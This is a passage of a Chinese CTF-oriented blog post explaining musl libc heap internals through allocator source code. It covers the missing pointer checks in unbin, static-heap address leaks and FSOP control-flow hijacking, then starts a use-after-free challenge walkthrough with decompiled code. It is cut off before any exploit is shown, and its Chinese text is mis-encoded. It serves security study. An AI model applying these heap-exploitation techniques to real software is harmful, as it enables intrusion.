class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    unbin ç›¸å½“äº glibc ä¸­çš„ unlinkï¼Œä½œç”¨æ˜¯ä» bin åŒå‘é“¾è¡¨ä¸­å–å‡º chunkï¼Œå–å‡ºè¿‡ç¨‹å¹¶æœªæ£€æŸ¥ chunk æŒ‡é’ˆæ˜¯å¦åˆæ³•ã€‚</p><h4 id="pretrim"><a href="#pretrim" class="headerlink" title="pretrim"></a>pretrim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pretrim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n, <span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> n1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="comment">// æ¡ä»¶1ï¼šbin j çš„ä¸‹æ ‡å¤§äºç­‰äº 40</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// æ¡ä»¶2ï¼šbin j ä¸ i ç›¸éš”äº† 3 ä¸ªåŠä»¥ä¸Š</span></span><br><span class="line">    <span class="comment">// æˆ– j == 63 ä¸” split çš„å¤§å°å¤§äº MMAP_THRESHOLD</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">n1 = CHUNK_SIZE(self);</span><br><span class="line"><span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">n1 = CHUNK_SIZE(self);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// æ¡ä»¶3ï¼šsplit çš„å¤§å°å±äº bin j èŒƒå›´å†…ï¼Œå³åŒå±äºä¸€ä¸ª bin</span></span><br><span class="line"><span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ‡å‰²å‡ºä¸€å—å¤§å°ä¸º n çš„ chunk</span></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;prev = self-&gt;prev;</span><br><span class="line">split-&gt;next = self-&gt;next;</span><br><span class="line">split-&gt;prev-&gt;next = split;</span><br><span class="line">split-&gt;next-&gt;prev = split;</span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1-n;</span><br><span class="line">next-&gt;psize = n1-n;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    pretrim çš„åŠŸèƒ½æ˜¯ç”¨äºåˆ‡å‰²å¤§ chunkï¼Œé˜²æ­¢æŠŠå¤§å°è¶…è¿‡éœ€æ±‚çš„ chunk åˆ†é…ç»™ç”¨æˆ·ã€‚å½“æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œpretrim ä» bin é“¾è¡¨é¦–éƒ¨ chunk åˆ‡å‰²å‡ºä¸€å—å¤§å°åˆšå¥½ç¬¦åˆéœ€è¦çš„å° chunkï¼Œç„¶åå°†å° chunk åˆ†é…ç»™ç”¨æˆ·ï¼Œé“¾è¡¨é¦–éƒ¨åœ°å€ä¿æŒä¸å˜ã€‚</p><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¡ä»¶ï¼šselfçš„å¤§å° n1 å¤§äº n+DONTCAREï¼ˆ0x10ï¼‰ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† self çš„å¤§å°åˆ‡å‰²ä¸º nï¼Œå‰©ä½™éƒ¨åˆ†ç§°ä¸ºæ–°çš„ chunk split</span></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† split é‡Šæ”¾åˆ° bin</span></span><br><span class="line">__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    malloc çš„æœ€åä¸€æ­¥æ˜¯ trimï¼Œä¸»è¦ä½œç”¨æ˜¯å›æ”¶ chunk è¶…è¿‡éœ€æ±‚å¤§å°çš„éƒ¨åˆ†ã€‚trim å°†å¤šä½™çš„éƒ¨åˆ†åˆ‡å‰²å‡ºæ¥ï¼Œç„¶åå°†å…¶é‡Šæ”¾åˆ° bin ä¸­ï¼Œä»¥å‡å°‘å†…å­˜æµªè´¹ã€‚</p><h3 id="2-3-free-å®ç°"><a href="#2-3-free-å®ç°" class="headerlink" title="2-3 free å®ç°"></a>2-3 free å®ç°</h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="comment">// è‹¥ csize æ²¡æœ‰è®¾ç½® INUSE æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦ä¸º mmap chunk æˆ– double free</span></span><br><span class="line"><span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">unmap_chunk(self);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">__bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    free å…ˆå¯¹ chunk è¿›è¡Œ mmap / double free æ£€æŸ¥ã€‚å¦‚æœ chunk çš„ csize å­—æ®µæ²¡æœ‰è®¾ç½® INUSE æ ‡å¿—ä½ï¼Œè¿›å…¥ unmap_chunk å‡½æ•°ã€‚</p><h4 id="unmap-chunk"><a href="#unmap-chunk" class="headerlink" title="unmap_chunk"></a>unmap_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line"><span class="type">char</span> *base = (<span class="type">char</span> *)self - extra;</span><br><span class="line"><span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line"><span class="comment">/* Crash on double free */</span></span><br><span class="line"><span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ psize è®¾ç½®äº† INUSE æ ‡å¿—ä½ï¼Œè§†ä¸º double freeï¼Œç¨‹åº crashï¼Œå¦åˆ™è§†ä¸º mmap chunkï¼Œè°ƒç”¨ __munmap è¿›è¡Œé‡Šæ”¾ã€‚</p><h4 id="bin-chunk"><a href="#bin-chunk" class="headerlink" title="__bin_chunk"></a>__bin_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __bin_chunk(<span class="keyword">struct</span> chunk *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line"><span class="type">size_t</span> final_size, new_size, size;</span><br><span class="line"><span class="type">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size æ˜¯ self åŸæ¥çš„å¤§å°ï¼Œfinal_size æ˜¯ self åˆå¹¶ç©ºé—² chunk åçš„å¤§å°</span></span><br><span class="line">final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk çš„ psize ä½ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ç¨‹åº crash</span></span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. æ£€æŸ¥ self å‰åæ˜¯å¦æœ‰ç©ºé—² chunk</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// å»é™¤ INUSE ä½</span></span><br><span class="line">self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// è®¡ç®— final_size å¯¹åº”ä¸‹æ ‡</span></span><br><span class="line">i = bin_index(final_size);</span><br><span class="line">lock_bin(i);</span><br><span class="line">lock(mal.free_lock);</span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//é€€å‡ºå¾ªç¯</span></span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘å‰åˆå¹¶ç©ºé—²çš„ chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">self = PREV_CHUNK(self);</span><br><span class="line">size = CHUNK_SIZE(self);</span><br><span class="line">final_size += size;</span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘ååˆå¹¶ç©ºé—²çš„ chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">size = CHUNK_SIZE(next);</span><br><span class="line">final_size += size;</span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">next = NEXT_CHUNK(next);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. åœ¨ binmap ä¸­ï¼Œå°† bin i è®¾ä¸ºéç©º bin</span></span><br><span class="line"><span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">self-&gt;csize = final_size;</span><br><span class="line">next-&gt;psize = final_size;</span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°† self åŠ å…¥åˆ° bin i å¯¹åº”é“¾è¡¨çš„å°¾éƒ¨</span></span><br><span class="line">self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">self-&gt;next-&gt;prev = self;</span><br><span class="line">self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line"><span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line"><span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line"><span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">__madvise((<span class="type">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">__mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    __bin_chunk çš„åŠŸèƒ½æ˜¯å°† chunk æ’å…¥åˆ° bin é“¾è¡¨ä¸­ï¼Œé¦–å…ˆåˆå¹¶ chunk å‰åçš„ç©ºé—² chunkï¼Œè®¾ç½® binmap å’Œ chunk æ ‡å¿—ä½ï¼Œæœ€åå°† chunk æ’å…¥åˆ° bin é“¾è¡¨ä¸­ã€‚</p><h3 id="2-4-é™æ€å †å†…å­˜åˆå§‹åŒ–"><a href="#2-4-é™æ€å †å†…å­˜åˆå§‹åŒ–" class="headerlink" title="2-4 é™æ€å †å†…å­˜åˆå§‹åŒ–"></a>2-4 é™æ€å †å†…å­˜åˆå§‹åŒ–</h3><p>â€‹    åœ¨ glibc ä¸­ï¼Œå †ä¸€èˆ¬ä½äºå†…å­˜ä¸­çš„åŠ¨æ€å†…å­˜åŒºåŸŸï¼Œè€Œ musl libc å †ç®¡ç†å™¨ä¸ºäº†å‡å°‘å†…å­˜å¼€é”€ï¼Œå°†ç¨‹åºå’Œ libc åº“ï¼ˆé™æ€å†…å­˜ï¼‰çš„ç©ºé—²å†…å­˜åˆ’åˆ†ä¸ºå †å†…å­˜ï¼Œå¹¶<strong>ä¼˜å…ˆä½¿ç”¨é™æ€å †å†…å­˜</strong>æ¥åˆ†é… chunkã€‚åªæœ‰å½“é™æ€å †å†…å­˜è€—å°½æˆ–æ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œmusl libc æ‰ä¼šå»ç”³è¯·åŠ¨æ€å†…å­˜ã€‚</p><p>â€‹    è¯¥ç‰¹æ€§æœ‰åŠ©äºæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­çš„<strong>ä¿¡æ¯æ³„éœ²</strong>ï¼Œå¾€å¾€å¯ä»¥å¾—åˆ° libc æˆ–æ˜¯ç¨‹åºåŸºå€ä¿¡æ¯ã€‚</p><h4 id="dls3"><a href="#dls3" class="headerlink" title="__dls3"></a>__dls3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __dls3(<span class="type">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ....</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">reclaim_gaps(&amp;app);</span><br><span class="line">reclaim_gaps(&amp;ldso);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    æºä»£ç å¾ˆé•¿ï¼Œå…³é”®åœ¨äº reclaim_gaps è¿™ä¸ªå‡½æ•°ã€‚</p><h4 id="reclaim-gaps-amp-reclaim"><a href="#reclaim-gaps-amp-reclaim" class="headerlink" title="reclaim_gaps &amp; reclaim"></a>reclaim_gaps &amp; reclaim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim</span><span class="params">(<span class="keyword">struct</span> dso *dso, <span class="type">size_t</span> start, <span class="type">size_t</span> end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// é¿å¼€ RELRO æ®µ</span></span><br><span class="line"><span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line"><span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line"><span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line"><span class="type">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨ __malloc_donate å‡½æ•°å°†å†…å­˜é‡Šæ”¾åˆ° bin ä¸­</span></span><br><span class="line">__malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim_gaps</span><span class="params">(<span class="keyword">struct</span> dso *dso)</span></span><br><span class="line">&#123;</span><br><span class="line">Phdr *ph = dso-&gt;phdr;</span><br><span class="line"><span class="type">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ¯ä¸€ä¸ªæ®µ</span></span><br><span class="line"><span class="keyword">for</span> (; phcnt--; ph=(<span class="type">void</span> *)((<span class="type">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// æ¡ä»¶1ï¼šæ®µä¸å±äºå¯åŠ è½½æ®µï¼ˆPT_LOADï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// æ¡ä»¶2ï¼šæ®µå¯è¯»å¯å†™</span></span><br><span class="line"><span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// åœ¨æ®µæ‰€å±å†…å­˜é¡µä¸­ï¼Œå°†æ®µçš„å‰åç©ºé—²å†…å­˜ä¼ é€’ç»™ reclaim å‡½æ•°</span></span><br><span class="line">reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    reclaim_gaps å‡½æ•°é€šè¿‡éå†æ¯ä¸ªå†…å­˜æ®µï¼Œæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„æ®µï¼Œè®¡ç®—å…¶æ‰€å±å†…å­˜é¡µï¼Œæœ€åé€šè¿‡ __malloc_donate å°†é¡µä¸­çš„ç©ºé—²å†…å­˜é‡Šæ”¾åˆ° bin ä¸­ã€‚</p><h2 id="3-æ¼æ´åˆ©ç”¨æ‰‹æ³•"><a href="#3-æ¼æ´åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="3 æ¼æ´åˆ©ç”¨æ‰‹æ³•"></a>3 æ¼æ´åˆ©ç”¨æ‰‹æ³•</h2><p>â€‹    ç”±äºåœ¨ musl libc ä¸­æ²¡æœ‰åƒ glibc ä¸­é‚£æ ·çš„ hook æŒ‡é’ˆæ¥è°ƒç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨åˆ°çš„éƒ½æ˜¯ FSOP å³è¦†ç›– FILE ç»“æ„ä½“ä¸­çš„æŸäº›æŒ‡é’ˆæ¥åŠ«æŒæ§åˆ¶æµã€‚</p><p>â€‹    è¯¦ç»†çš„åˆ©ç”¨æ‰‹æ³•ä»¥åé‡åˆ°ä¾‹é¢˜å†æ€»ç»“ä¸Šæ¥ã€‚</p><h2 id="4-ä¾‹é¢˜"><a href="#4-ä¾‹é¢˜" class="headerlink" title="4 ä¾‹é¢˜"></a>4 ä¾‹é¢˜</h2><h4 id="ä¾‹é¢˜ä¿¡æ¯"><a href="#ä¾‹é¢˜ä¿¡æ¯" class="headerlink" title="ä¾‹é¢˜ä¿¡æ¯"></a>ä¾‹é¢˜ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ¥æºï¼š2023ç¾ŠåŸæ¯åˆèµ›-cookieBox</span><br><span class="line">libcç‰ˆæœ¬ï¼šmusl libc 1.1.24</span><br><span class="line">æ¼æ´ï¼šUAF</span><br><span class="line">é™åˆ¶ï¼šå †å—å¤§å° &lt;= 0x100</span><br><span class="line">     size å’Œ chunk ä»¥ç›¸åŒ idx åŒæ—¶å¸ƒç½®åœ¨ bss ä¸Šï¼Œé‡Šæ”¾å †å—ä¼šæ¸…ç©º sizeï¼Œedit å’Œ show åŠŸèƒ½ä¼šå¯¹ size è¿›è¡Œæ£€æµ‹ã€‚</span><br></pre></td></tr></table></figure><p>ADD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_400A50</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the size:&quot;</span>);</span><br><span class="line">  *size = input_number();<span class="comment">// è¾“å…¥å¤§å°</span></span><br><span class="line">  <span class="keyword">if</span> ( size[<span class="number">0</span>] &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;size[<span class="number">1</span>] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);<span class="comment">// åˆ†é…å†…å­˜</span></span><br><span class="line">  <span class="keyword">if</span> ( !*&amp;size[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the Content:&quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, *&amp;size[<span class="number">1</span>], size[<span class="number">0</span>]);<span class="comment">// å¾€å †å†…å­˜è¯»å–æ•°æ®</span></span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> 